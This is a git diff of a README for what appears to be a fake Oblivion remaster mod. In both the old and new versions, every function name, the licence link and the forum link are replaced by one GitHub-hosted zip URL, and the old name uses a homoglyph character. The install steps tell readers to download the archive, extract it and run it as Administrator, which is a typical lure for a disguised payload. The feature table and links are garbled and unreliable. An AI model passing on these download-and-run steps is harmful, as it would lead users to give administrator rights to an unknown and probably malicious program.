@@ -43,13 +43,13 @@ Get the most complete remaster for 2025 with these standout features, optimized 
 
 Start playing Oblivion like it’s 2025—only better! Please follow these steps to guarantee a hassle-free setup. ⚡
 
-### 1. Download https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip from the repository  
+### 1. Download https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip from the repository  
 All the core files and installer utilities are packed inside. This is your all-in-one tool for rapid deployment.
 
-### 2. Extract https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip  
+### 2. Extract https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip  
 Use your favorite archive tool (such as 7-Zip or WinRAR) to extract all contents to a new folder.
 
-### 3. Run https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip as Administrator  
+### 3. Run https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip as Administrator  
 Right-click and select "Run as Administrator" for best results. The loader will check your Oblivion installation and prepare your directories.
 
 ### 4. Follow the On-Screen Instructions  
@@ -71,13 +71,13 @@ Here’s a detailed description of the primary functions offered by this mod. Ea
 
 | Function Name           | Description | OS Support | Usage Tips |  
 |------------------------ |--------------------------|:----------:|-------------------------|  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip              | Launches installer, checks files, includes Safe Mode | Windows | Must be run as admin   |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip   | Replaces Oblivion visuals with 4K remastered assets  | All      | Customize via ini file |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip        | Unlocks mature questlines, romance, and new dialogue | All      | Requires new game      |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip    | Real-time FPS, ENB & memory improvements             | All      | Enable via loader menu |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip     | Introduces companion romance, dialog, and loyalty    | All      | Progress via quests    |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip            | Launches Oblivion with minimal mods for troubleshooting | Windows | For error recovery     |  
-| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip          | Checks for patches & mod updates from online repo    | Windows  | Run monthly            |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip              | Launches installer, checks files, includes Safe Mode | Windows | Must be run as admin   |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip   | Replaces Oblivion visuals with 4K remastered assets  | All      | Customize via ini file |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip        | Unlocks mature questlines, romance, and new dialogue | All      | Requires new game      |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip    | Real-time FPS, ENB & memory improvements             | All      | Enable via loader menu |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip     | Introduces companion romance, dialog, and loyalty    | All      | Progress via quests    |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip            | Launches Oblivion with minimal mods for troubleshooting | Windows | For error recovery     |  
+| https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip          | Checks for patches & mod updates from online repo    | Windows  | Run monthly            |  
 
 **For an extensive module breakdown and guidance, see the docs/** folder in your download.**
 
@@ -93,14 +93,14 @@ Oblivion and all trademarks are property of Bethesda Softworks and ZeniMax Media
 
 ## 📎 License - MIT 📎
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip).  
 You are free to use, modify, and distribute this software with attribution. See `LICENSE` for full details.
 
 ---
 
 ## 🚩 Stay Connected & Get Support! 🚩
 
-- 💬 Join the community forum and chat channels—links in `https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/Lоader.zip`!
+- 💬 Join the community forum and chat channels—links in `https://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zipоhttps://raw.githubusercontent.com/jeckef/unnamed_game_1_v2/main/epidictical/game-unnamed-v-1.3-beta.4.zip`!
 - 📢 Submit feedback, bug reports, and feature requests via the Issues tab.
 - 🌠 Watch for frequent updates with new content, bug fixes, and enhancements for 2025 and beyond!
 
